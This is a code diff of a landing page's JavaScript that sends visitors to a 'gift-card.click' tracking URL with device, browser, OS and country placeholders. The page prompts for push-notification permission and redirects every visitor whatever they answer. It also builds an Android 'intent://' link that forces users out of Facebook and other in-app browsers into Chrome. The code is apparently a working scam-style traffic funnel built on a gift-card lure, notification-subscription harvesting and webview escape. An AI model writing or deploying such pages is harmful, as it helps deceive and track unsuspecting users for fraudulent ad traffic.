@@ -61,28 +61,28 @@
         <div class="item2"></div>
     </div>
     <script>
-        var redirect_url = "https://gift-card.click/visit/425f32ac-d32c-46f9-bda6-2e756671d298";
-        console.log('location.search', location.search);
-            var src_clid_1__=new URLSearchParams(location.search).get('src_clid_1');
-        console.log("src_clid_1__",src_clid_1__)
-        var device_vendor=new URLSearchParams(location.search).get('device_vendor');
-        console.log("device_vendor",device_vendor)
-        var device_model=new URLSearchParams(location.search).get('device_model');
-        console.log("device_model",device_model)
-        var browser_name=new URLSearchParams(location.search).get('browser_name');
-        console.log("browser_name",browser_name)
-        var browser_version=new URLSearchParams(location.search).get('browser_version');
-        console.log("browser_version",browser_version)
-        var os_name=new URLSearchParams(location.search).get('os_name');
-        console.log("os_name",os_name);
-        var os_version=new URLSearchParams(location.search).get('os_version');
-        console.log("os_version",os_version);
-        var country=new URLSearchParams(location.search).get('country');
-        console.log("country",country);
-        var country_name=new URLSearchParams(location.search).get('country_name');
-        console.log("country_name",country_name);
-        var window_location_href = redirect_url+src_clid_1__+"&device_vendor="+device_vendor+"&device_model="+device_model+"&browser_name="+browser_name+"&browser_version="+browser_version+"&os_name="+os_name+"&os_version="+os_version+"&country="+country+"&country_name="+country_name;
-
+        var redirect_url = 'https://gift-card.click/visit/425f32ac-d32c-46f9-bda6-2e756671d298?cost={cost}&src_clid_1={external_id}&device_vendor={device_vendor}&device_model={device_model}&browser_name={browser_name}&browser_version={browser_version}&os_name={os_name}&os_version={os_version}&country={country}&country_name={country_name}';
+        // console.log('location.search', location.search);
+        //     var src_clid_1__=new URLSearchParams(location.search).get('src_clid_1');
+        // console.log("src_clid_1__",src_clid_1__)
+        // var device_vendor=new URLSearchParams(location.search).get('device_vendor');
+        // console.log("device_vendor",device_vendor)
+        // var device_model=new URLSearchParams(location.search).get('device_model');
+        // console.log("device_model",device_model)
+        // var browser_name=new URLSearchParams(location.search).get('browser_name');
+        // console.log("browser_name",browser_name)
+        // var browser_version=new URLSearchParams(location.search).get('browser_version');
+        // console.log("browser_version",browser_version)
+        // var os_name=new URLSearchParams(location.search).get('os_name');
+        // console.log("os_name",os_name);
+        // var os_version=new URLSearchParams(location.search).get('os_version');
+        // console.log("os_version",os_version);
+        // var country=new URLSearchParams(location.search).get('country');
+        // console.log("country",country);
+        // var country_name=new URLSearchParams(location.search).get('country_name');
+        // console.log("country_name",country_name);
+        // var window_location_href = redirect_url+src_clid_1__+"&device_vendor="+device_vendor+"&device_model="+device_model+"&browser_name="+browser_name+"&browser_version="+browser_version+"&os_name="+os_name+"&os_version="+os_version+"&country="+country+"&country_name="+country_name;
+        
         //////////////////////////////////////////
          function  createspan(){
             for (let i = 0; i < 12; i++) {
@@ -105,15 +105,15 @@
     s.onload = function(result) {
         switch (result) {
             case 'onPermissionDefault':
-            Replace(window_location_href);break;
+            Replace(redirect_url);break;
             case 'onPermissionAllowed':
-            Replace(window_location_href);break;
+            Replace(redirect_url);break;
             case 'onPermissionDenied':
-            Replace(window_location_href);break;
+            Replace(redirect_url);break;
             case 'onAlreadySubscribed':
-            Replace(window_location_href);break;
+            Replace(redirect_url);break;
             case 'onNotificationUnsupported':
-            Replace(window_location_href);break;
+            Replace(redirect_url);break;
         }
     };
     document.head.appendChild(s);
@@ -129,7 +129,7 @@
     function initInappRd() {
         var landingpageURL = window.location.hostname + window.location.pathname + window.location.search;
         var completeRedirectURL = 'intent://' + landingpageURL + '#Intent;scheme=https;package=com.android.chrome;end';
-        var trafficbackURL = window_location_href;
+        var trafficbackURL = redirect_url;
         var ua = navigator.userAgent.toLowerCase();
 
         if (isInApp() && (ua.indexOf('fb') !== -1 || ua.indexOf('android') !== -1 || ua.indexOf('wv') !== -1)) {
